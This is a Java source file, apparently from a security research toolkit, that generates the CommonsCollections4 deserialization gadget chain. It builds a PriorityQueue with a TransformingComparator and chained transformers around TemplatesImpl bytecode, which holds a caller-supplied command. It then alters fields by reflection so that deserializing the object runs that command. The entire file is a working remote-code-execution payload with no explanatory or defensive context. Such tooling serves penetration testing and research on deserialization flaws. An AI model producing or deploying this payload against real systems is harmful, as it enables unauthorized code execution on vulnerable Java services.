package com.xyuxu.javasec.core.payload.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;



import javax.xml.transform.Templates;
import java.util.PriorityQueue;
import java.util.Queue;



public class CommonsCollections4 implements ObjectPayload<Object>{

    @Override
    public Queue<Object> getObject(final String command) throws Exception {

        final TemplatesImpl templates = TemplatesBytecodeGenerator.createTemplatesImpl(command);
        ConstantTransformer constant = new ConstantTransformer(String.class);

        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes,
                args);

        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] { constant, instantiate });


        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chainedTransformer));
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        return queue;

    }
}













